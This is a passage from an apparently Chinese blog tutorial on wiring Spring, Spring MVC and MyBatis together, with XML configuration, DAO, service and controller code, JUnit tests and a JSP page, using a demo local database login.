<h3 id="6-1-配置Spring的监听器"><a href="#6-1-配置Spring的监听器" class="headerlink" title="6.1 配置Spring的监听器"></a>6.1 配置Spring的监听器</h3><p>web.xml中添加如下配置，使其加载spring的配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置Spring的监听器，默认只加载WEB-INF目录下的applicationContext.xml配置文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置配置文件的路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="6-2-Spring依赖注入"><a href="#6-2-Spring依赖注入" class="headerlink" title="6.2 Spring依赖注入"></a>6.2 Spring依赖注入</h3><p>添加<code>@Autowired</code>注解，在controller中自动注入service对象，从而实现没有创建对象在controller里调用service里的<code>findAll()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.service.AccountService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户web</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/account&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountService accountService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;findALL&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findALL</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;表现层：查询所有账户...&quot;</span>);</span><br><span class="line">        accountService.findAll();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;list&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-3-部署测试"><a href="#6-3-部署测试" class="headerlink" title="6.3 部署测试"></a>6.3 部署测试</h3><p>当我们重写部署点击测试的时候，后台运行结果如下</p>
<p><img src="../images/pics/java/26.jpg"> </p>
<p>可以发现，这时候成功运行了业务层的代码。</p>
<h2 id="7-Spring整合Mybatis"><a href="#7-Spring整合Mybatis" class="headerlink" title="7. Spring整合Mybatis"></a>7. Spring整合Mybatis</h2><h3 id="7-1-Mybatis环境测试"><a href="#7-1-Mybatis环境测试" class="headerlink" title="7.1 Mybatis环境测试"></a>7.1 Mybatis环境测试</h3><p>使用mybatis注解的方式给AccountDao添加sql语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Insert;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountDao</span> </span>&#123;</span><br><span class="line">    <span class="comment">//查询所有账户</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from account&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存所有账户信息</span></span><br><span class="line">    <span class="meta">@Insert(&quot;insert into account (name, money) values (#&#123;name&#125;,#&#123;money&#125;)&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在resources目录下创建SqlMapConfig.xml，给Mybatis添加配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置环境--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;mysql&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;mysql&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://172.16.42.150:3306/ssm&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--引入映射配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;mapper class=&quot;com.shadowflow.dao.AccountDao&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.shadowflow.dao&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编写测试方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.dao.AccountDao;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMybatis</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run1</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//加载配置文件</span></span><br><span class="line">        InputStream in = Resources.getResourceAsStream(<span class="string">&quot;SqlMapConfig.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//创建SqlSessionFactory对象</span></span><br><span class="line">        SqlSessionFactory factory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(in);</span><br><span class="line">        <span class="comment">//创建SqlSession对象</span></span><br><span class="line">        SqlSession session = factory.openSession();</span><br><span class="line">        <span class="comment">//获取代理对象</span></span><br><span class="line">        AccountDao dao = session.getMapper(AccountDao.class);</span><br><span class="line">        <span class="comment">//查询所有数据</span></span><br><span class="line">        List&lt;Account&gt; list = dao.findAll();</span><br><span class="line">        <span class="keyword">for</span>(Account account : list)&#123;</span><br><span class="line">            System.out.println(account);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//关闭资源</span></span><br><span class="line">        session.close();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="../images/pics/java/28.jpg"> </p>
<p>表示Mybatis配置完成</p>
<p>顺便测试一下保存方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.dao.AccountDao;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestMybatis</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**测试查询</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run1</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试保存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run2</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Account account = <span class="keyword">new</span> Account();</span><br><span class="line">        account.setName(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        account.setMoney(<span class="number">3000d</span>);</span><br><span class="line">        <span class="comment">//加载配置文件</span></span><br><span class="line">        InputStream in = Resources.getResourceAsStream(<span class="string">&quot;SqlMapConfig.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//创建SqlSessionFactory对象</span></span><br><span class="line">        SqlSessionFactory factory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(in);</span><br><span class="line">        <span class="comment">//创建SqlSession对象</span></span><br><span class="line">        SqlSession session = factory.openSession();</span><br><span class="line">        <span class="comment">//获取代理对象</span></span><br><span class="line">        AccountDao dao = session.getMapper(AccountDao.class);</span><br><span class="line">        <span class="comment">//保存</span></span><br><span class="line">        dao.saveAccount(account);</span><br><span class="line">        <span class="comment">//提交事务</span></span><br><span class="line">        session.commit();</span><br><span class="line"></span><br><span class="line">        session.close();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="7-8-Mybatis代理对象存入IOC容器"><a href="#7-8-Mybatis代理对象存入IOC容器" class="headerlink" title="7.8 Mybatis代理对象存入IOC容器"></a>7.8 Mybatis代理对象存入IOC容器</h3><p>在Spring配置文件中配Mybatis，在applicationContext.xml加入如下Mybatis配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--spring整合Mybatis框架--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--配置连接池--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://172.16.42.150:3306/ssm&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--配置SqlSessionFactory工厂--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--配置AccountDao接口所在包--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;mapperScanner&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;basePackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.shadowflow.dao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>整个文件如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:tx</span>=<span class="string">&quot;http://www.springframework.org/schema/tx&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/aop/spring-context.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/tx</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/tx/spring-tx.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启注解扫描，希望处理service和dao,controller不需要spring框架处理--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.shadowflow&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 配置那些注解不扫描 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--spring整合Mybatis框架--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置连接池--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://172.16.42.150:3306/ssm&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置SqlSessionFactory工厂--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置AccountDao接口所在包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;mapperScanner&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;basePackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.shadowflow.dao&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>有了上面的配置就可以删除SqlMapConfig.xml了</p>
<p>接下来需要给AccountDao添加<code>@Repository</code>注解，表示交给Spring容器来管理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Insert;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountDao</span> </span>&#123;</span><br><span class="line">    <span class="comment">//查询所有账户</span></span><br><span class="line">    <span class="meta">@Select(&quot;select * from account&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存所有账户信息</span></span><br><span class="line">    <span class="meta">@Insert(&quot;insert into account (name, money) values (#&#123;name&#125;,#&#123;money&#125;)&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在AccountServiceImpl中注入accountDao</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.dao.AccountDao;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.service.AccountService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service(&quot;accountService&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccountService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountDao accountDao;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;业务层:查询所有账户...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> accountDao.findAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;业务层：保存账户...&quot;</span>);</span><br><span class="line">        accountDao.saveAccount(account);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="8-测试"><a href="#8-测试" class="headerlink" title="8. 测试"></a>8. 测试</h2><p>现在我们改造AccountController，以展示效果，将查询结果存入域对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.shadowflow.domain.Account;</span><br><span class="line"><span class="keyword">import</span> com.shadowflow.service.AccountService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户web</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/account&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountService accountService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;findALL&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findALL</span><span class="params">(Model model)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;表现层：查询所有账户...&quot;</span>);</span><br><span class="line">        <span class="comment">//调用service方法</span></span><br><span class="line">        List&lt;Account&gt; list = accountService.findAll();</span><br><span class="line">        <span class="comment">//存入到域对象</span></span><br><span class="line">        model.addAttribute(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;list&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在list.jsp中取出于对象</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> isELIgnored=<span class="string">&quot;false&quot;</span> %&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    </span><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>查询所有的帐户<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    </span><span class="xml"><span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">&quot;$&#123;list&#125;&quot;</span> <span class="attr">var</span>=<span class="string">&quot;account&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        $</span><span class="xquery">&#123;account<span class="built_in">.name</span>&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>查询结果</p>
<p><img src="../images/pics/java/29.jpg"> </p>
